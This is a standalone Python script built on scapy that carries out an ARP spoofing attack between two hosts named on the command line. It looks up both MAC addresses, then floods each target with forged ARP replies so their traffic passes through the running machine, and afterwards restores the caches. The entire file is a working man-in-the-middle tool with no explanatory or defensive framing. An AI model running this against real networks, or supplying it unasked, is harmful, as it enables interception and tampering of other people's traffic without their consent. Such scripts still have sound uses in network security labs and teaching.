#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import threading
from scapy.all import *

def getmac(ip):
    print("Getting mac by %s..." % ip)
    res, ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip), timeout=2, retry=10, verbose=0)
    for r, e in res:
        return e[Ether].src
    print("Cannot get mac!!!")
    exit(1)


def spoof(src, hwsrc, dst, hwdst):
    print("Starting spoofing...")
    while start:
        send(ARP(op=2, psrc=src, pdst=dst, hwdst=hwdst), verbose=0)
        send(ARP(op=2, psrc=dst, pdst=src, hwdst=hwsrc), verbose=0)
    print("Finished spoofing...")

def restore(src, hwsrc, dst, hwdst):
    print("Restoring...")
    time.sleep(1)
    send(ARP(op=2, psrc=dst, pdst=src, hwsrc=hwdst, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    send(ARP(op=2, psrc=src, pdst=dst, hwsrc=hwsrc, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    print("Finish...")

def main():
    global start
    if len(sys.argv) < 3:
        print("Usage: %s <ip> <ip>" % sys.argv[0])
        exit(1)
    src = sys.argv[1]
    hwsrc = getmac(src)
    dst = sys.argv[2]
    hwdst = getmac(dst)
    t = threading.Thread(target=spoof, args=(src, hwsrc, dst, hwdst))
    print("%s %s" % (src, hwsrc))
    print("%s %s" % (dst, hwdst))
    if input("Start(y/N) ").lower()[0] == 'n':
        print("Bye!")
        exit(0)
    start = True
    t.start()
    while True:
        ans = input("Stop? (yes) ")
        if ans and ans.lower()[0] == 'y':
            start = False
            break
    while t.is_alive():
        print("Waiting spoof thread...")
        time.sleep(1)
    restore(src, hwsrc, dst, hwdst)

if __name__ == "__main__":
    main()



